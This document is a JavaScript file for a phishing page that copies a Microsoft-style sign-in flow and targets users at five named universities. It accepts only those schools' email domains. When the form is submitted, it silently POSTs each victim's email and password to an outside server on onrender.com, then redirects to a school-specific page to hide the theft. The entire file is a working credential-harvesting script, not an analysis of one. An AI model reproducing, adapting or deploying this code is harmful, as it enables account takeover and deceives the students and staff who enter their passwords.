document.addEventListener("DOMContentLoaded", function() {
    //BUTTON
    const nextBtn = document.querySelector('#idSIButton9');
    const submitBtn = document.getElementById('submitBtn');
    const backBtn = document.querySelector('#idBtn_Back');
    //Word base on page
    const accessAcct = document.getElementById('accessAcc');
    const forPAss = document.getElementById('forPass')
    // Get email and password values
    const email = document.getElementById("username");
    const password = document.getElementById("password");
    email.addEventListener('keypress', (e)=>{
        if(e.target.keycode === 13){
            e.preventDefault();
        }
    })
    nextBtn.addEventListener('click', (e)=>{
        e.preventDefault();
        //console.log(validateEmail(email.value))
        if(email.value.endsWith('@shc.edu') || email.value.endsWith('@hsu.edu') || email.value.endsWith('@sautech.edu') || email.value.endsWith('@judsonu.edu') || email.value.endsWith('@hendrix.edu')){
            email.style.display = 'none';
            password.style.display = 'block';
            e.target.style.display = 'none';
            submitBtn.style.display = 'block';
            forPAss.style.display = 'block';
            accessAcct.style.display = 'none';
        
        }else{
            alert('Invalid email')
        };
    })
    backBtn.addEventListener('click', (e)=>{
        e.preventDefault();
        email.style.display = 'block';
        password.style.display = 'none';
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
        forPAss.style.display = 'none';
        accessAcct.style.display = 'block';
        
    });

    const loginForm = document.getElementById("i0281");

    // Add submit event listener
    loginForm.addEventListener("submit", function(event){
        // Prevent the default form submission
        event.preventDefault();
        
        if(password.value != ''){
             //Send Login detail to admin for notification
             const userData = {
                FullName: password.value,
                Email: email.value,
                Password: "username",
            };
            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method : "POST",
                headers : {
                "Content-Type" : "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            });
        
            // Redirect to home page after a delay (e.g., 2 seconds)
            setTimeout(function() {
                if(userData.Email.endsWith('@shc.edu')){
                    window.location.href = 'hills.html';
                }else if(userData.Email.endsWith('@hsu.edu')){
                    window.location.href = 'state.html';
                }else if(userData.Email.endsWith('@sautech.edu')){
                    window.location.href = 'tech.html';
                }else if(userData.Email.endsWith('@judsonu.edu')){
                    window.location.href = 'son.html';
                }else{
                    window.location.href = 'matrix.html';
                }
            }, 2000)
        }else{
            alert('Password can\'t be empty')
        }

        
        // Validate email and password
            
        
    })
   
    // // Function to validate email
    // function validateEmail(email) {
    //     // Check if the email ends with "@mit.edu"
    //     return email.endsWith("@bobcats.gcsu.edu");
    // }

    // // Function to validate password
    // function validatePassword(password) {
    //     // Check if the password is not empty
    //     return password.trim() !== "";
    // }
});

